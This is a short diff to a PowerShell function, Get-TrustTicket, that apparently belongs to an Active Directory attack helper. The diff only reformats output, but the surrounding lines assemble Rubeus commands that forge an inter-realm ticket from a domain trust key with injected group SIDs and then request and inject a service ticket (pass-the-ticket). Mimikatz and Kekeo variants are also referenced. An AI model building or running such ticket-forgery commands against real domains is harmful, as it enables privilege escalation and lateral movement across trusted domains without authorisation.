@@ -79,9 +79,13 @@ function Get-TrustTicket{
     $rubeusTGT = "Rubeus.exe silver /sids:$TargetGroupSID /target:$targetDomain /rc4:$trustKey /sid:$SID /domain:$Domain /user:$User /service:$Service/$targetDomain /ldap /nowrap"
     $rubeusTGS = "Rubeus.exe asktgs /ticket:B64_TGT /service:$tgsServie/$targetComputer /dc:$targetDC /nowrap /ptt"
 
-    Write-Host "Mimikatz TGT + Kekeo TGS" -ForegroundColor Cyan 
-    Write-Host $mimiTGT`n$kekeoTGS
+    Write-Host `n"Printing: Mimikatz TGT command" `n -ForegroundColor Yellow 
+    Write-Host $mimiTGT `n
+    Write-Host "Printing: Kekeo TGS" `n
+    Write-Host $kekeoTGS `n
 
-    Write-Host "Rubeus" -ForegroundColor Cyan
-    Write-Host $rubeusTGT`n$rubeusTGS
+    Write-Host "Printing: Rubeus TGT" `n -ForegroundColor Yellow
+    Write-Host $rubeusTGT `n
+    Write-Host "Printing: Rubeus TGS" `n
+    Write-Host $rubeusTGS `n
 }
